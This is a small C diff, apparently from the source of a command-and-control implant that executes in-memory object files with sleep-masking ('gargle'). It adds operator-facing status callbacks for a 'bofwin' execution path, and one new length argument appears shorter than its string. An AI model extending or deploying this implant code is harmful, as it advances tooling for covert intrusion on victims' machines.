@@ -685,12 +685,15 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 							gargle_setup_parms(NULL, NULL, 0);
 						if (bofwin_window((void (*)(void *, int))inlinefunc, args, alen, 0))
 							command_shell_callback("bofwin window served", 20, CALLBACK_OUTPUT);
-						else
+						else {
+							command_shell_callback("bofwin window declined", 22, CALLBACK_OUTPUT);
 							inlinefunc(args, alen);
+						}
 					}
-					else {
-						inlinefunc(args, alen);
-					}
+						else {
+							command_shell_callback("bofwin skipped (api/nook/threads)", 31, CALLBACK_OUTPUT);
+							inlinefunc(args, alen);
+						}
 #else
 				inlinefunc(args, alen);
 #endif
